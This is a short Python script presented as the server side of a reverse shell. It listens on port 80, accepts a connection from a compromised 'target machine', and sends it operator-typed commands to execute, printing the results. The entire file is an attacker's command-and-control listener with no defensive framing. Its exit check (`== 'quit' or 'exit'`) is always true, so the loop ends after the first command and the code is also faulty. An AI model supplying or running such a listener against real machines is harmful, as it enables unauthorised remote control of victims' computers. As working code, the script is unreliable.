# Reverse Shell Program that works as a server

import socket

# Define the variables such as server IP, port and buffer size
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 80
BUFFER_SIZE = 1024

# create a socket
s = socket.socket()

# bind the server to socket
s.bind((SERVER_HOST, SERVER_PORT))

# Continually listen for new connection
s.listen(5)
print(f"Listening for Connection at: {SERVER_HOST}:{SERVER_PORT}")

# Accept Connection from Client
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Just Connected!")

while True:
    command = input(f"Enter Command to Execute on {client_address[0]}'s Machine #> ")
    # send typed command to target machine to be executed.
    client_socket.send(command.encode())

    if command.lower() == "quit" or "exit":
        # End program and break from loop
        break

    # Receive the output of the command from the targets machine and display it on Server terminal.
    result = client_socket.recv(BUFFER_SIZE).decode()
    print(result)

# Close Client Connection
client_socket.close()

# Close Server Connection
s.close()
